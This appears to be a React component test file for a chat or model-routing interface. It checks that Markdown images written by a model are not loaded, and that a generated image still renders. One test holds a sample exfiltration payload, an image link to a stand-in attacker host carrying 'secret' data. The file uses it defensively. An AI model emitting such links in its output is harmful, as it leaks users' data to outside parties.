import { render, screen } from '@testing-library/react'
import { expect, it } from 'vitest'
import type { Turn } from '../types'
import { CallSlip } from './CallSlip'

function turnWith(step: { text?: string; imageUrl?: string | null }): Turn {
  return {
    key: 'turn',
    number: 1,
    prompt: 'synthetic prompt',
    route: { target: 'muse-spark', reason: 'fits', alternatives: [], steps: [], routed_by: 'router' },
    status: 'done',
    steps: [
      {
        id: 'step',
        target: 'muse-spark',
        servedBy: null,
        text: step.text ?? '',
        imageUrl: step.imageUrl ?? null,
        fallbacks: [],
        error: null,
      },
    ],
  } as Turn
}

it('never loads an image a model wrote into its Markdown', () => {
  const text = 'Done. ![x](https://attacker.example/leak?data=secret)'

  render(<CallSlip turn={turnWith({ text })} names={new Map()} />)

  expect(screen.getByText(/Done\./)).toBeInTheDocument()
  expect(screen.queryByRole('img')).toBeNull()
})

it("still shows the image Orin generated", () => {
  const imageUrl = `/api/images/${'a'.repeat(32)}.png`

  render(<CallSlip turn={turnWith({ imageUrl })} names={new Map()} />)

  expect(screen.getByRole('img')).toHaveAttribute('src', imageUrl)
})
